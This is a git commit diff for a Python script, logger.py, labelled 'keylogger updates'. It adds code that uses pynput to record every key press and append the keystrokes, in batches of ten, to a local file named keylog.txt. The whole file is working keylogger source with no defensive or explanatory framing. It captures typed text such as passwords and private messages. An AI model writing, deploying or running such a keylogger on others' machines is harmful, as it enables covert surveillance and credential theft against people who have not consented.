4c3e6d0966c192cdaeed36d8532bfe9483ec4308
Josh Yap <joshua.c.yap@gmail.com>
2020-01-12 21:32:07 -0600

    keylogger updates

--- logger.py
+++ logger.py
@@ -1,12 +1,28 @@
-from pynput.keyboard import Key, Listener # pip install pynput
+from pynput.keyboard import Key, Listener  # pip install pynput
 
 keys = []
+count = 0  # keeping track of how many items are in the keys array at a time
+
 
 def on_press(e):
-    global keys # accessing the global keys array
-    keys.append(e) # add the pressed key to the array
+    global keys, count  # accessing the global keys array
+    keys.append(e)  # add the pressed key to the array
+    count += 1
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []  # empty the array after writing
 
-with Listener(on_press = on_press) as listener:
+
+def write_file(keys):
+    with open("keylog.txt", "a+") as f:  # the a+ tells python to create log.txt if it does not exist
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write(' ')
+            elif k.find("Key") == -1:
+                f.write(k)
+
+
+with Listener(on_press=on_press) as listener:
     listener.join()
-
-    
